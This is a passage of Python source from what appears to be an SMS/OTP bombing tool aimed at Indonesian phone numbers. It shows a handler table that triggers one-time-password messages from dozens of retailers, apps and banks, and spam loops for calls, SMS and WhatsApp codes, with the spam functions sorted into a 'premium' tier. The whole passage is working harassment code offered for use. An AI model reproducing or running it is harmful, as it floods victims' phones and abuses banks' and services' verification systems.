                success += 1
        except:
            pass
    return success

def spam_wa_code_all(phone):
    methods = [wa_code_1, wa_code_2, wa_code_3, wa_code_4, wa_code_5, wa_code_6]
    success = 0
    for method in methods:
        try:
            resp = method(phone)
            if resp and resp.status_code in [200, 201, 202, 204]:
                success += 1
        except:
            pass
    return success

# ================================================================
# ===== ALL HANDLERS DICT =====
# ================================================================

ALL_HANDLERS = {
    # OTP HANDLERS
    'pinhome': send_pinhome_otp,
    'rumah123': send_rumah123_otp,
    'paper': send_paper_otp,
    'bonusbelanja': send_bonusbelanja_otp,
    'duniagames': send_duniagames_otp,
    'hijup': send_hijup_otp,
    'alodokter': send_alodokter_otp,
    'bliblitiket': send_bliblitiket_otp,
    'matahari': send_matahari_otp,
    'ohsome': send_ohsome_otp,
    'optikmelawai': send_optikmelawai_otp,
    'hollandbakery': send_hollandbakery_otp,
    'maulagi': send_maulagi_otp,
    'bunda': send_bunda_otp,
    'planetban': send_planetban_otp,
    'hashmicro': send_hashmicro_otp,
    'tuneup': send_tuneup_otp,
    'internetrakyat': send_internetrakyat_otp,
    'ultramilk': send_ultramilk_register,
    'kaniva': send_kaniva_otp,
    'jembatani': send_jembatani_otp,
    'rcx': send_rcx_otp,
    'sahabatteknisi': send_sahabatteknisi_otp,
    'auto2000': send_auto2000_otp,
    '99co': send_99co_otp,
    'belirumah': send_belirumah_otp,
    'fastwork': send_fastwork_otp,
    'astra_daihatsu': send_astra_daihatsu_otp,
    'royal_canin': send_royal_canin_otp,
    'watsons': send_watsons_otp,
    'hrsbre': send_hrsbre_otp,
    'erafone': send_erafone_otp,
    'beautyhaul': send_beautyhaul_otp,
    'hainaya': send_hainaya_otp,
    'minumyukkaka': send_minumyukkaka_otp,
    'sidemang': send_sidemang_otp,
    'lapormasbup': send_lapormasbup_otp,
    'ptsp_kemenag': send_ptsp_kemenag_otp,
    'shopee': send_shopee_otp,
    'tokopedia': send_tokopedia_otp,
    'gojek': send_gojek_otp,
    'blibli': send_blibli_otp,
    'bukalapak': send_bukalapak_otp,
    'lazada': send_lazada_id_otp,
    'jdid': send_jdid_otp,
    'zalora': send_zalora_id_otp,
    'sociolla': send_sociolla_otp,
    'tiktok': send_tiktok_otp,
    'olx': send_olx_otp,
    'indihome': send_indihome_otp,
    'klook': send_klook_otp,
    'halodoc': send_halodoc_otp,
    'sayurbox': send_sayurbox_otp,
    'carsome': send_carsome_otp,
    'pizzahut': send_pizzahut_otp,
    # INDONESIA BANKS
    'bri': send_bri_otp,
    'bri_sms': send_bri_sms_otp,
    'danamon': send_danamon_otp,
    'mandiri': send_mandiri_otp,
    'bca': send_bca_otp,
    'bni': send_bni_otp,
    'btn': send_btn_otp,
    'cimb': send_cimb_otp,
    'permata': send_permata_otp,
    'ocbc': send_ocbc_otp,
    'btpn': send_btpn_otp,
    'jenius': send_jenius_otp,
    # SPAM
    'spam_call': spam_call_all,
    'spam_sms': spam_sms_all,
    'wa_call': spam_wa_call_all,
    'wa_code': spam_wa_code_all,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_premium_handlers():
    premium = {}
    premium_list = ['spam_call', 'spam_sms', 'wa_call', 'wa_code']
    for k in premium_list:
        if k in ALL_HANDLERS:
            premium[k] = ALL_HANDLERS[k]
    return premium
